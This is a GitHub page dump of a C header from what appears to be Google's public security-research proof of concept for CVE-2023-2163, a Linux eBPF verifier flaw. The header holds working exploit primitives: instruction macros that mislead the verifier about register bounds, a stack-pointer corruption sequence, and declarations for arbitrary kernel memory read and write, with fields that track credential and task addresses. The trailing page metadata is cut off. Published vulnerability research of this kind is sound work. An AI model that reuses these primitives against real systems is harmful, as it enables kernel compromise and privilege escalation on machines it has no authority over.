{"payload":{"allShortcutsEnabled":false,"fileTree":{"pocs/linux/cve-2023-2163/include":{"items":[{"name":"exploit_prims.h","path":"pocs/linux/cve-2023-2163/include/exploit_prims.h","contentType":"file"},{"name":"kernel_helpers.h","path":"pocs/linux/cve-2023-2163/include/kernel_helpers.h","contentType":"file"},{"name":"radix-tree.h","path":"pocs/linux/cve-2023-2163/include/radix-tree.h","contentType":"file"}],"totalCount":3},"pocs/linux/cve-2023-2163":{"items":[{"name":"include","path":"pocs/linux/cve-2023-2163/include","contentType":"directory"},{"name":"Makefile","path":"pocs/linux/cve-2023-2163/Makefile","contentType":"file"},{"name":"exploit.c","path":"pocs/linux/cve-2023-2163/exploit.c","contentType":"file"},{"name":"exploit_prims.c","path":"pocs/linux/cve-2023-2163/exploit_prims.c","contentType":"file"},{"name":"kernel_helpers.c","path":"pocs/linux/cve-2023-2163/kernel_helpers.c","contentType":"file"},{"name":"readme.md","path":"pocs/linux/cve-2023-2163/readme.md","contentType":"file"}],"totalCount":6},"pocs/linux":{"items":[{"name":"bleedingtooth","path":"pocs/linux/bleedingtooth","contentType":"directory"},{"name":"cve-2021-22555","path":"pocs/linux/cve-2021-22555","contentType":"directory"},{"name":"cve-2023-2163","path":"pocs/linux/cve-2023-2163","contentType":"directory"},{"name":"kernelctf","path":"pocs/linux/kernelctf","contentType":"directory"},{"name":"kvm_vma","path":"pocs/linux/kvm_vma","contentType":"directory"},{"name":"kvmctf","path":"pocs/linux/kvmctf","contentType":"directory"}],"totalCount":6},"pocs":{"items":[{"name":"apple","path":"pocs/apple","contentType":"directory"},{"name":"azure","path":"pocs/azure","contentType":"directory"},{"name":"bios","path":"pocs/bios","contentType":"directory"},{"name":"bleve","path":"pocs/bleve","contentType":"directory"},{"name":"cpus","path":"pocs/cpus","contentType":"directory"},{"name":"grub","path":"pocs/grub","contentType":"directory"},{"name":"kakadu","path":"pocs/kakadu","contentType":"directory"},{"name":"linux","path":"pocs/linux","contentType":"directory"},{"name":"log4j","path":"pocs/log4j","contentType":"directory"},{"name":"oracle","path":"pocs/oracle","contentType":"directory"}],"totalCount":10},"":{"items":[{"name":".github","path":".github","contentType":"directory"},{"name":"analysis","path":"analysis","contentType":"directory"},{"name":"kernelctf","path":"kernelctf","contentType":"directory"},{"name":"kvmctf","path":"kvmctf","contentType":"directory"},{"name":"pocs","path":"pocs","contentType":"directory"},{"name":"v8ctf","path":"v8ctf","contentType":"directory"},{"name":".gitignore","path":".gitignore","contentType":"file"},{"name":"CONTRIBUTING.md","path":"CONTRIBUTING.md","contentType":"file"},{"name":"LICENSE","path":"LICENSE","contentType":"file"},{"name":"README.md","path":"README.md","contentType":"file"},{"name":"SECURITY.md","path":"SECURITY.md","contentType":"symlink_file"}],"totalCount":11}},"fileTreeProcessingTime":10.238883000000001,"foldersToFetch":[],"repo":{"id":272394704,"defaultBranch":"master","name":"security-research","ownerLogin":"google","currentUserCanPush":false,"isFork":false,"isEmpty":false,"createdAt":"2020-06-15T09:19:51.000Z","ownerAvatar":"https://avatars.githubusercontent.com/u/1342004?v=4","public":true,"private":false,"isOrgOwned":true},"symbolsExpanded":false,"treeExpanded":true,"refInfo":{"name":"master","listCacheKey":"v0:1705762328.0","canEdit":false,"refType":"branch","currentOid":"c79c9829bda8b5111174e5806fb3b12126a6f66e"},"path":"pocs/linux/cve-2023-2163/include/exploit_prims.h","currentUser":null,"blob":{"rawLines":["#ifndef _EXPLOIT_PRIMS_","","#include <linux/bpf.h>","","#define _EXPLOIT_PRIMS_","#define BPF_ALU_IMM(OP, DST, IMM, INS_CLASS)\t\t\t\t\\","    ((struct bpf_insn) {\t\t\t\t\t\\","     .code  = INS_CLASS | BPF_OP(OP) | BPF_K,\t\\","     .dst_reg = DST,\t\t\t\t\t\\","     .src_reg = 0,\t\t\t\t\t\\","     .off   = 0,\t\t\t\t\t\\","     .imm   = IMM })","","#define BPF_ALU_REG(OP, DST, SRC, INS_CLASS)\t\t\t\t\\","    ((struct bpf_insn) {\t\t\t\t\t\\","     .code  = INS_CLASS | BPF_OP(OP) | BPF_X,\t\\","     .dst_reg = DST,\t\t\t\t\t\\","     .src_reg = SRC,\t\t\t\t\t\\","     .off   = 0,\t\t\t\t\t\\","     .imm   = 0 })","","#define BPF_EXIT_INSN()\t\t\t\t\t\t\\","    ((struct bpf_insn) {\t\t\t\t\t\\","     .code  = BPF_JMP | BPF_EXIT,\t\t\t\\","     .dst_reg = 0,\t\t\t\t\t\\","     .src_reg = 0,\t\t\t\t\t\\","     .off   = 0,\t\t\t\t\t\\","     .imm   = 0 })","","#define BPF_JMP_REG(OP, DST, SRC, OFF, INS_CLASS)\t\t\t\t\\","    ((struct bpf_insn) {\t\t\t\t\t\\","     .code  = INS_CLASS | BPF_OP(OP) | BPF_X,\t\t\\","     .dst_reg = DST,\t\t\t\t\t\\","     .src_reg = SRC,\t\t\t\t\t\\","     .off   = OFF,\t\t\t\t\t\\","     .imm   = 0 })","","#define BPF_JMP_IMM(OP, DST, IMM, OFF, INS_CLASS)\t\t\t\t\\","    ((struct bpf_insn) {\t\t\t\t\t\\","     .code  = INS_CLASS | BPF_OP(OP) | BPF_K,\t\t\\","     .dst_reg = DST,\t\t\t\t\t\\","     .src_reg = 0,\t\t\t\t\t\\","     .off   = OFF,\t\t\t\t\t\\","     .imm   = IMM })","","#define BPF_CALL_FUNC(FUNCTION_NUMBER)\t\t\t\t\t\t\\","    ((struct bpf_insn) {\t\t\t\t\t\\","     .code  = BPF_JMP | BPF_CALL,\t\t\t\\","     .dst_reg = 0,\t\t\t\t\t\\","     .src_reg = 0,\t\t\t\t\t\\","     .off   = 0,\t\t\t\t\t\\","     .imm   = FUNCTION_NUMBER })","","#define BPF_LD_MAP_FD(DST, MAP_FD)\t\t\t\t\\","    ((struct bpf_insn) {\t\t\t\t\t\\","     .code  = BPF_LD | BPF_DW | BPF_IMM,\t\t\\","     .dst_reg = DST,\t\t\t\t\t\\","     .src_reg = 0x01,\t\t\t\t\t\\","     .off   = 0,\t\t\t\t\t\\","     .imm   = (__u32) (MAP_FD) }),\t\t\t\\","     ((struct bpf_insn) {\t\t\t\t\t\\","      .code  = 0, /* zero is reserved opcode */\t\\","      .dst_reg = 0,\t\t\t\t\t\\","      .src_reg = 0,\t\t\t\t\t\\","      .off   = 0,\t\t\t\t\t\\","      .imm   = ((__u64) (MAP_FD)) >> 32 })","","#define BPF_MEM_OPERATION(INS_CLASS, SIZE, DST, SRC, OFF)\t\t\t\\","    ((struct bpf_insn) {\t\t\t\t\t\\","     .code  = INS_CLASS | BPF_SIZE(SIZE) | BPF_MEM,\t\\","     .dst_reg = DST,\t\t\t\t\t\\","     .src_reg = SRC,\t\t\t\t\t\\","     .off   = OFF,\t\t\t\t\t\\","     .imm   = 0 })","#define BPF_MEM_IMM_OPERATION(INS_CLASS, SIZE, DST, IMM, OFF)\t\t\t\\","    ((struct bpf_insn) {\t\t\t\t\t\\","     .code  = INS_CLASS | BPF_SIZE(SIZE) | BPF_MEM,\t\\","     .dst_reg = DST,\t\t\t\t\t\\","     .src_reg = 0,\t\t\t\t\t\\","     .off   = OFF,\t\t\t\t\t\\","     .imm   = IMM })","","#define CORRUPT_R6   \\","    BPF_ALU_IMM(BPF_MOV, /*dst=*/BPF_REG_6, /*imm=*/149420059, /*ins_class=*/BPF_ALU64), \\","    BPF_ALU_IMM(BPF_MOV, /*dst=*/BPF_REG_7, /*imm=*/3982203280, /*ins_class=*/BPF_ALU64), \\","    BPF_ALU_IMM(BPF_MOV, /*dst=*/BPF_REG_8, /*imm=*/67, /*ins_class=*/BPF_ALU64), \\","    BPF_ALU_IMM(BPF_MOV, /*dst=*/BPF_REG_9, /*imm=*/1042510562, /*ins_class=*/BPF_ALU64), \\","    BPF_JMP_REG(BPF_JGT, /*dst=*/BPF_REG_7, /*src=*/BPF_REG_6, /*off=*/1, /*ins_class=*/BPF_JMP), \\","    BPF_ALU_IMM(BPF_MUL, /*dst=*/BPF_REG_7, /*imm=*/1, /*ins_class=*/BPF_ALU), \\","    BPF_JMP_REG(BPF_JEQ, /*dst=*/BPF_REG_6, /*src=*/BPF_REG_9, /*off=*/1, /*ins_class=*/BPF_JMP), \\","    BPF_ALU_IMM(BPF_ADD, /*dst=*/BPF_REG_6, /*imm=*/0, /*ins_class=*/BPF_ALU), \\","    BPF_ALU_IMM(BPF_MOV, /*dst=*/BPF_REG_6, /*imm=*/2613857455, /*ins_class=*/BPF_ALU64), \\","    BPF_ALU_IMM(BPF_MOD, /*dst=*/BPF_REG_6, /*imm=*/698566326, /*ins_class=*/BPF_ALU64), \\","    BPF_ALU_REG(BPF_RSH, /*dst=*/BPF_REG_7, /*src=*/BPF_REG_9, /*ins_class=*/BPF_ALU), \\","    BPF_ALU_REG(BPF_RSH, /*dst=*/BPF_REG_9, /*src=*/BPF_REG_7, /*ins_class=*/BPF_ALU64), \\","    BPF_ALU_REG(BPF_MOV, /*dst=*/BPF_REG_8, /*src=*/BPF_REG_7, /*ins_class=*/BPF_ALU64), \\","    BPF_JMP_REG(BPF_JSET, /*dst=*/BPF_REG_8, /*src=*/BPF_REG_9, /*off=*/4, /*ins_class=*/BPF_JMP), \\","    BPF_ALU_IMM(BPF_ADD, /*dst=*/BPF_REG_9, /*imm=*/635122136, /*ins_class=*/BPF_ALU), \\","    BPF_ALU_IMM(BPF_LSH, /*dst=*/BPF_REG_9, /*imm=*/46, /*ins_class=*/BPF_ALU64), \\","    BPF_ALU_IMM(BPF_MUL, /*dst=*/BPF_REG_8, /*imm=*/1, /*ins_class=*/BPF_ALU64), \\","    BPF_ALU_IMM(BPF_MUL, /*dst=*/BPF_REG_8, /*imm=*/1, /*ins_class=*/BPF_ALU64), \\","    BPF_JMP_REG(BPF_JNE, /*dst=*/BPF_REG_6, /*src=*/BPF_REG_9, /*off=*/2, /*ins_class=*/BPF_JMP), \\","    BPF_ALU_IMM(BPF_NEG, /*dst=*/BPF_REG_6, /*imm=*/BPF_REG_0, /*ins_class=*/BPF_ALU), \\","    BPF_ALU_IMM(BPF_LSH, /*dst=*/BPF_REG_9, /*imm=*/BPF_REG_7, /*ins_class=*/BPF_ALU), \\","    BPF_JMP_REG(BPF_JLE, /*dst=*/BPF_REG_6, /*src=*/BPF_REG_9, /*off=*/2, /*ins_class=*/BPF_JMP), \\","    BPF_ALU_IMM(BPF_MOD, /*dst=*/BPF_REG_6, /*imm=*/3021791800, /*ins_class=*/BPF_ALU), \\","    BPF_ALU_IMM(BPF_RSH, /*dst=*/BPF_REG_6, /*imm=*/40, /*ins_class=*/BPF_ALU64), \\","    BPF_ALU_IMM(BPF_RSH, /*dst=*/BPF_REG_6, /*imm=*/28, /*ins_class=*/BPF_ALU)","","// 1. Store random scalar to stack - 8","// 2. Store (stack pointer - 8) to stack - 16","// 3. Call skb_load_bytes_relative, this will overwrite (stack - 16)","// 4. Load stack - 16 to R1, verifier thinks we have a ptr to stack - 8 here","//    hence it allows any scalar writing... but in fact we have an arbitrary","//    pointer.","#define CORRUPT_STACK_PTR \\","    CORRUPT_R6, \\","    BPF_ALU_REG(BPF_MOV, /*dst=*/BPF_REG_9, /*src=*/BPF_REG_1, /*ins_class=*/BPF_ALU64), \\","    BPF_ALU_IMM(BPF_MOV, /*dst=*/BPF_REG_1, /*imm=*/0xCAFE, /*ins_class=*/BPF_ALU64), \\","    BPF_MEM_OPERATION(BPF_STX, BPF_DW, /*dst=*/BPF_REG_10, /*src=*/BPF_REG_1, /*offset=*/-8), \\","    \\","    BPF_ALU_REG(BPF_MOV, /*dst=*/BPF_REG_2, /*src=*/BPF_REG_10, /*ins_class=*/BPF_ALU64), \\","    BPF_ALU_IMM(BPF_ADD, /*dst=*/BPF_REG_2, /*imm=*/-8, /*ins_class=*/BPF_ALU64), \\","    BPF_MEM_OPERATION(BPF_STX, BPF_DW, /*dst=*/BPF_REG_10, /*src=*/BPF_REG_2, /*offset=*/-16), \\","    \\","    BPF_ALU_REG(BPF_MOV, BPF_REG_1, BPF_REG_9, BPF_ALU64), \\","    BPF_ALU_IMM(BPF_MOV, BPF_REG_2, 0, BPF_ALU64), \\","    BPF_ALU_REG(BPF_MOV, BPF_REG_3, BPF_REG_10, BPF_ALU64), \\","    BPF_ALU_IMM(BPF_ADD, BPF_REG_3, -24, BPF_ALU64), \\","    BPF_ALU_REG(BPF_MOV, BPF_REG_4, BPF_REG_6, BPF_ALU64), \\","    BPF_ALU_IMM(BPF_MUL, BPF_REG_4, 8, BPF_ALU64), \\","    BPF_ALU_IMM(BPF_ADD, BPF_REG_4, 8, BPF_ALU64), \\","    BPF_ALU_IMM(BPF_MOV, BPF_REG_5, 1, BPF_ALU64), \\","    BPF_CALL_FUNC(BPF_FUNC_skb_load_bytes_relative), \\","    \\","    BPF_MEM_OPERATION(BPF_LDX, BPF_DW, /*dst=*/BPF_REG_1, /*src=*/BPF_REG_10, /*offset=*/-16)","","typedef struct context {","    int map_fd;","    int map_size;","","    int read_fd;","","    void *kernel_memory;","    int kernel_page_size;","    int kernel_allocated_pages;","","    uint64_t init_pid_fs;","    uint64_t init_pid_cap_inh;","    uint64_t init_pid_cap_perm;","    uint64_t init_pid_cap_eff;","","    uint64_t map_leak;","    uint64_t ops_leak;","    uint64_t init_proc_ns_kstrtab;","    uint64_t init_proc_ns_addr;","    uint64_t task_addr;","    uint64_t creds_addr;","} context;","","int load_prog(struct bpf_insn *instructions, size_t insn_count);","","int bpf_create_map(unsigned int max_entries); ","","int get_map_contents(context *ctx, uint64_t *contents); ","","int setup_send_sock(); ","","int setup_listener_sock(); ","","int bpf_prog_skb_run(int prog_fd, const void *data, size_t size); ","","int execute_bpf_program(context* ctx, int prog_fd, uint64_t *map_contents, void *data, int data_len); ","","int prepare_read(context *ctx); ","","int write_to_address(context *ctx, uint64_t target_address, uint64_t value); ","","int read_from_address(context *ctx, uint64_t target_address, uint64_t* value); ","","int kernel_read_bytes(context *ctx, uint64_t target_address, void *destination, uint64_t size);","#endif"],"stylingDirectives":[[{"start":0,"end":7,"cssClass":"pl-k"},{"start":8,"end":23,"cssClass":"pl-s1"}],[],[{"start":0,"end":8,"cssClass":"pl-k"},{"start":9,"end":22,"cssClass":"pl-s"}],[],[{"start":0,"end":7,"cssClass":"pl-k"},{"start":8,"end":23,"cssClass":"pl-s1"}],[{"start":0,"end":7,"cssClass":"pl-k"},{"start":8,"end":19,"cssClass":"pl-en"},{"start":20,"end":22,"cssClass":"pl-c1"},{"start":24,"end":27,"cssClass":"pl-c1"},{"start":29,"end":32,"cssClass":"pl-c1"},{"start":34,"end":43,"cssClass":"pl-c1"}],[],[],[],[],[],[],[],[{"start":0,"end":7,"cssClass":"pl-k"},{"start":8,"end":19,"cssClass":"pl-en"},{"start":20,"end":22,"cssClass":"pl-c1"},{"start":24,"end":27,"cssClass":"pl-c1"},{"start":29,"end":32,"cssClass":"pl-c1"},{"start":34,"end":43,"cssClass":"pl-c1"}],[],[],[],[],[],[],[],[{"start":0,"end":7,"cssClass":"pl-k"},{"start":8,"end":21,"cssClass":"pl-en"}],[],[],[],[],[],[],[],[{"start":0,"end":7,"cssClass":"pl-k"},{"start":8,"end":19,"cssClass":"pl-en"},{"start":20,"end":22,"cssClass":"pl-c1"},{"start":24,"end":27,"cssClass":"pl-c1"},{"start":29,"end":32,"cssClass":"pl-c1"},{"start":34,"end":37,"cssClass":"pl-c1"},{"start":39,"end":48,"cssClass":"pl-c1"}],[],[],[],[],[],[],[],[{"start":0,"end":7,"cssClass":"pl-k"},{"start":8,"end":19,"cssClass":"pl-en"},{"start":20,"end":22,"cssClass":"pl-c1"},{"start":24,"end":27,"cssClass":"pl-c1"},{"start":29,"end":32,"cssClass":"pl-c1"},{"start":34,"end":37,"cssClass":"pl-c1"},{"start":39,"end":48,"cssClass":"pl-c1"}],[],[],[],[],[],[],[],[{"start":0,"end":7,"cssClass":"pl-k"},{"start":8,"end":21,"cssClass":"pl-en"},{"start":22,"end":37,"cssClass":"pl-c1"}],[],[],[],[],[],[],[],[{"start":0,"end":7,"cssClass":"pl-k"},{"start":8,"end":21,"cssClass":"pl-en"},{"start":22,"end":25,"cssClass":"pl-c1"},{"start":27,"end":33,"cssClass":"pl-c1"}],[],[],[],[],[],[],[],[],[],[],[],[],[],[{"start":0,"end":7,"cssClass":"pl-k"},{"start":8,"end":25,"cssClass":"pl-en"},{"start":26,"end":35,"cssClass":"pl-c1"},{"start":37,"end":41,"cssClass":"pl-c1"},{"start":43,"end":46,"cssClass":"pl-c1"},{"start":48,"end":51,"cssClass":"pl-c1"},{"start":53,"end":56,"cssClass":"pl-c1"}],[],[],[],[],[],[],[{"start":0,"end":7,"cssClass":"pl-k"},{"start":8,"end":29,"cssClass":"pl-en"},{"start":30,"end":39,"cssClass":"pl-c1"},{"start":41,"end":45,"cssClass":"pl-c1"},{"start":47,"end":50,"cssClass":"pl-c1"},{"start":52,"end":55,"cssClass":"pl-c1"},{"start":57,"end":60,"cssClass":"pl-c1"}],[],[],[],[],[],[],[],[{"start":0,"end":7,"cssClass":"pl-k"},{"start":8,"end":18,"cssClass":"pl-c1"}],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[{"start":0,"end":38,"cssClass":"pl-c"}],[{"start":0,"end":45,"cssClass":"pl-c"}],[{"start":0,"end":68,"cssClass":"pl-c"}],[{"start":0,"end":76,"cssClass":"pl-c"}],[{"start":0,"end":76,"cssClass":"pl-c"}],[{"start":0,"end":14,"cssClass":"pl-c"}],[{"start":0,"end":7,"cssClass":"pl-k"},{"start":8,"end":25,"cssClass":"pl-c1"}],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[{"start":0,"end":7,"cssClass":"pl-k"},{"start":8,"end":14,"cssClass":"pl-k"},{"start":15,"end":22,"cssClass":"pl-smi"}],[{"start":4,"end":7,"cssClass":"pl-smi"},{"start":8,"end":14,"cssClass":"pl-c1"}],[{"start":4,"end":7,"cssClass":"pl-smi"},{"start":8,"end":16,"cssClass":"pl-c1"}],[],[{"start":4,"end":7,"cssClass":"pl-smi"},{"start":8,"end":15,"cssClass":"pl-c1"}],[],[{"start":4,"end":8,"cssClass":"pl-smi"},{"start":9,"end":10,"cssClass":"pl-c1"},{"start":10,"end":23,"cssClass":"pl-c1"}],[{"start":4,"end":7,"cssClass":"pl-smi"},{"start":8,"end":24,"cssClass":"pl-c1"}],[{"start":4,"end":7,"cssClass":"pl-smi"},{"start":8,"end":30,"cssClass":"pl-c1"}],[],[{"start":4,"end":12,"cssClass":"pl-smi"},{"start":13,"end":24,"cssClass":"pl-c1"}],[{"start":4,"end":12,"cssClass":"pl-smi"},{"start":13,"end":29,"cssClass":"pl-c1"}],[{"start":4,"end":12,"cssClass":"pl-smi"},{"start":13,"end":30,"cssClass":"pl-c1"}],[{"start":4,"end":12,"cssClass":"pl-smi"},{"start":13,"end":29,"cssClass":"pl-c1"}],[],[{"start":4,"end":12,"cssClass":"pl-smi"},{"start":13,"end":21,"cssClass":"pl-c1"}],[{"start":4,"end":12,"cssClass":"pl-smi"},{"start":13,"end":21,"cssClass":"pl-c1"}],[{"start":4,"end":12,"cssClass":"pl-smi"},{"start":13,"end":33,"cssClass":"pl-c1"}],[{"start":4,"end":12,"cssClass":"pl-smi"},{"start":13,"end":30,"cssClass":"pl-c1"}],[{"start":4,"end":12,"cssClass":"pl-smi"},{"start":13,"end":22,"cssClass":"pl-c1"}],[{"start":4,"end":12,"cssClass":"pl-smi"},{"start":13,"end":23,"cssClass":"pl-c1"}],[{"start":2,"end":9,"cssClass":"pl-smi"}],[],[{"start":0,"end":3,"cssClass":"pl-smi"},{"start":4,"end":13,"cssClass":"pl-en"},{"start":14,"end":20,"cssClass":"pl-k"},{"start":21,"end":29,"cssClass":"pl-smi"},{"start":30,"end":31,"cssClass":"pl-c1"},{"start":31,"end":43,"cssClass":"pl-s1"},{"start":45,"end":51,"cssClass":"pl-smi"},{"start":52,"end":62,"cssClass":"pl-s1"}],[],[{"start":0,"end":3,"cssClass":"pl-smi"},{"start":4,"end":18,"cssClass":"pl-en"},{"start":19,"end":31,"cssClass":"pl-smi"},{"start":28,"end":31,"cssClass":"pl-smi"},{"start":32,"end":43,"cssClass":"pl-s1"}],[],[{"start":0,"end":3,"cssClass":"pl-smi"},{"start":4,"end":20,"cssClass":"pl-en"},{"start":21,"end":28,"cssClass":"pl-smi"},{"start":29,"end":30,"cssClass":"pl-c1"},{"start":30,"end":33,"cssClass":"pl-s1"},{"start":35,"end":43,"cssClass":"pl-smi"},{"start":44,"end":45,"cssClass":"pl-c1"},{"start":45,"end":53,"cssClass":"pl-s1"}],[],[{"start":0,"end":3,"cssClass":"pl-smi"},{"start":4,"end":19,"cssClass":"pl-en"}],[],[{"start":0,"end":3,"cssClass":"pl-smi"},{"start":4,"end":23,"cssClass":"pl-en"}],[],[{"start":0,"end":3,"cssClass":"pl-smi"},{"start":4,"end":20,"cssClass":"pl-en"},{"start":21,"end":24,"cssClass":"pl-smi"},{"start":25,"end":32,"cssClass":"pl-s1"},{"start":34,"end":39,"cssClass":"pl-k"},{"start":40,"end":44,"cssClass":"pl-smi"},{"start":45,"end":46,"cssClass":"pl-c1"},{"start":46,"end":50,"cssClass":"pl-s1"},{"start":52,"end":58,"cssClass":"pl-smi"},{"start":59,"end":63,"cssClass":"pl-s1"}],[],[{"start":0,"end":3,"cssClass":"pl-smi"},{"start":4,"end":23,"cssClass":"pl-en"},{"start":24,"end":31,"cssClass":"pl-smi"},{"start":31,"end":32,"cssClass":"pl-c1"},{"start":33,"end":36,"cssClass":"pl-s1"},{"start":38,"end":41,"cssClass":"pl-smi"},{"start":42,"end":49,"cssClass":"pl-s1"},{"start":51,"end":59,"cssClass":"pl-smi"},{"start":60,"end":61,"cssClass":"pl-c1"},{"start":61,"end":73,"cssClass":"pl-s1"},{"start":75,"end":79,"cssClass":"pl-smi"},{"start":80,"end":81,"cssClass":"pl-c1"},{"start":81,"end":85,"cssClass":"pl-s1"},{"start":87,"end":90,"cssClass":"pl-smi"},{"start":91,"end":99,"cssClass":"pl-s1"}],[],[{"start":0,"end":3,"cssClass":"pl-smi"},{"start":4,"end":16,"cssClass":"pl-en"},{"start":17,"end":24,"cssClass":"pl-smi"},{"start":25,"end":26,"cssClass":"pl-c1"},{"start":26,"end":29,"cssClass":"pl-s1"}],[],[{"start":0,"end":3,"cssClass":"pl-smi"},{"start":4,"end":20,"cssClass":"pl-en"},{"start":21,"end":28,"cssClass":"pl-smi"},{"start":29,"end":30,"cssClass":"pl-c1"},{"start":30,"end":33,"cssClass":"pl-s1"},{"start":35,"end":43,"cssClass":"pl-smi"},{"start":44,"end":58,"cssClass":"pl-s1"},{"start":60,"end":68,"cssClass":"pl-smi"},{"start":69,"end":74,"cssClass":"pl-s1"}],[],[{"start":0,"end":3,"cssClass":"pl-smi"},{"start":4,"end":21,"cssClass":"pl-en"},{"start":22,"end":29,"cssClass":"pl-smi"},{"start":30,"end":31,"cssClass":"pl-c1"},{"start":31,"end":34,"cssClass":"pl-s1"},{"start":36,"end":44,"cssClass":"pl-smi"},{"start":45,"end":59,"cssClass":"pl-s1"},{"start":61,"end":69,"cssClass":"pl-smi"},{"start":69,"end":70,"cssClass":"pl-c1"},{"start":71,"end":76,"cssClass":"pl-s1"}],[],[{"start":0,"end":3,"cssClass":"pl-smi"},{"start":4,"end":21,"cssClass":"pl-en"},{"start":22,"end":29,"cssClass":"pl-smi"},{"start":30,"end":31,"cssClass":"pl-c1"},{"start":31,"end":34,"cssClass":"pl-s1"},{"start":36,"end":44,"cssClass":"pl-smi"},{"start":45,"end":59,"cssClass":"pl-s1"},{"start":61,"end":65,"cssClass":"pl-smi"},{"start":66,"end":67,"cssClass":"pl-c1"},{"start":67,"end":78,"cssClass":"pl-s1"},{"start":80,"end":88,"cssClass":"pl-smi"},{"start":89,"end":93,"cssClass":"pl-s1"}],[{"start":0,"end":6,"cssClass":"pl-k"}]],"csv":null,"csvError":null,"dependabotInfo":{"showConfigurationBanner":false,"configFilePath":null,"networkDependabotPath":"/google/security-research/network/updates","dismissConfigurationNoticePath":"/settings/dismiss-notice/dependabot_configuration_notice","configurationNoticeDismissed":null},"displayName":"exploit_prims.h","displayUrl":"https://github.com/google/security-research/blob/master/pocs/linux/cve-2023-2163/include/exploit_prims.h?raw=true","headerInfo":{"blobSize":"7.12 KB","deleteTooltip":"You must be signed in to make or propose changes","editTooltip":"You must be signed in to make or propose changes","deleteInfo":{"deleteTooltip":"You must be signed in to make or propose changes"},"editInfo":{"editTooltip":"You must be signed in to make or propose changes"},"ghDesktopPath":"https://desktop.github.com","isGitLfs":false,"gitLfsPath":null,"onBranch":true,"shortPath":"0968636","siteNavLoginPath":"/login?return_to=https%3A%2F%2Fgithub.com%2Fgoogle%2Fsecurity-research%2Fblob%2Fmaster%2Fpocs%2Flinux%2Fcve-2023-2163%2Finclude%2Fexploit_prims.h","isCSV":false,"isRichtext":false,"toc":null,"lineInfo":{"truncatedLoc":"182","truncatedSloc":"155"},"mode":"file"},"image":false,"isCodeownersFile":null,"isPlain":false,"isValidLegacyIssueTemplate":false,"issueTemplateHelpUrl":"https://docs.github.com/articles/about-issue-and-pull-request-templates","issueTemplate":null,"discussionTemplate":null,"language":"C","languageID":41,"large":false,"loggedIn":false,"planSupportInfo":{"repoIsFork":null,"repoOwnedByCurrentUser":null,"requestFullPath":"/google/security-research/blob/master/pocs/linux/cve-2023-2163/include/exploit_prims.h","showFreeOrgGatedFeatureMessage":null,"showPlanSupportBanner":null,"upgradeDataAttributes":null,"upgradePath":null},"publishBannersInfo":{"dismissActionNoticePath":"/settings/dismiss-notice/publish_action_from_dockerfile","releasePath":"/google/security-research/releases/new?marketplace=true","showPublishActionBanner":false},"rawBlobUrl":"https://github.com/google/security-research/raw/master/pocs/linux/cve-2023-2163/include/exploit_prims.h","renderImageOrRaw":false,"richText":null,"renderedFileInfo":null,"shortPath":null,"symbolsEnabled":true,"tabSize":8,"topBannersInfo":{"overridingGlobalFundingFile":false,"globalPreferredFundingPath":null,"repoOwner":"google","repoName":"security-research","showInvalidCitationWarning":false,"citationHelpUrl":"https://docs.github.com/github/creating-cloning-and-archiving-repositories/creating-a-repository-on-github/about-citation-files","actionsOnboardingTip":null},"truncated":false,"viewable":true,"workflowRedirectUrl":null,"symbols":{"timed_out":false,"not_analyzed":false,"symbols":[{"name":"_EXPLOIT_PRIMS_","kind":"macro","ident_start":57,"ident_end":72,"extent_start":49,"extent_end":73,"fully_qualified_name":"_EXPLOIT_PRIMS_","ident_utf16":{"start":{"line_number":4,"utf16_col":8},"end":{"line_number":4,"utf16_col":23}},"extent_utf16":{"start":{"line_number":4,"utf16_col":0},"end":{"line_number":5,"utf16_col":0}}},{"name":"CORRUPT_R6","kind":"macro","ident_start":2345,"ident_end":2355,"extent_start":2337,"extent_end":4607,"fully_qualified_name":"CORRUPT_R6","ident_utf16":{"start":{"line_number":82,"utf16_col":8},"end":{"line_number":82,"utf16_col":18}},"extent_utf16":{"start":{"line_number":82,"utf16_col":0},"end":{"line_number":109,"utf16_col":0}}},{"name":"CORRUPT_STACK_PTR","kind":"macro","ident_start":4938,"ident_end":4955,"extent_start":4930,"extent_end":6143,"fully_qualified_name":"CORRUPT_STACK_PTR","ident_utf16":{"start":{"line_number":115,"utf16_col":8},"end":{"line_number":115,"utf16_col":25}},"extent_utf16":{"start":{"line_number":115,"utf16_col":0},"end":{"line_number":137,"utf16_col":0}}},{"name":"context","kind":"class","ident_start":6158,"ident_end":6165,"extent_start":6151,"extent_end":6589,"fully_qualified_name":"context","ident_utf16":{"start":{"line_number":137,"utf16_col":15},"end":{"line_number":137,"utf16_col":22}},"extent_utf16":{"start":{"line_number":137,"utf16_col":8},"end":{"line_number":158,"utf16_col":1}}},{"name":"context","kind":"type","ident_start":6590,"ident_end":6597,"extent_start":6143,"extent_end":6598,"fully_qualified_name":"context","ident_utf16":{"start":{"line_number":158,"utf16_col":2},"end":{"line_number":158,"utf16_col":9}},"extent_utf16":{"start":{"line_number":137,"utf16_col":0},"end":{"line_number":158,"utf16_col":10}}},{"name":"load_prog","kind":"function","ident_start":6604,"ident_end":6613,"extent_start":6604,"extent_end":6663,"fully_qualified_name":"load_prog","ident_utf16":{"start":{"line_number":160,"utf16_col":4},"end":{"line_number":160,"utf16_col":13}},"extent_utf16":{"start":{"line_number":160,"utf16_col":4},"end":{"line_number":160,"utf16_col":63}}},{"name":"bpf_create_map","kind":"function","ident_start":6670,"ident_end":6684,"extent_start":6670,"extent_end":6710,"fully_qualified_name":"bpf_create_map","ident_utf16":{"start":{"line_number":162,"utf16_col":4},"end":{"line_number":162,"utf16_col":18}},"extent_utf16":{"start":{"line_number":162,"utf16_col":4},"end":{"line_number":162,"utf16_col":44}}},{"name":"get_map_contents","kind":"function","ident_start":6718,"ident_end":6734,"extent_start":6718,"extent_end":6768,"fully_qualified_name":"get_map_contents","ident_utf16":{"start":{"line_number":164,"utf16_col":4},"end":{"line_number":164,"utf16_col":20}},"extent_utf16":{"start":{"line_number":164,"utf16_col":4},"end":{"line_number":164,"utf16_col":54}}},{"name":"setup_send_sock","kind":"function","ident_start":6776,"ident_end":6791,"extent_start":6776,"extent_end":6793,"fully_qualified_name":"setup_send_sock","ident_utf16":{"start":{"line_number":166,"utf16_col":4},"end":{"line_number":166,"utf16_col":19}},"extent_utf16":{"start":{"line_number":166,"utf16_col":4},"end":{"line_number":166,"utf16_col":21}}},{"name":"setup_listener_sock","kind":"function","ident_start":6801,"ident_end":6820,"extent_start":6801,"extent_end":6822,"fully_qualified_name":"setup_listener_sock","ident_utf16":{"start":{"line_number":168,"u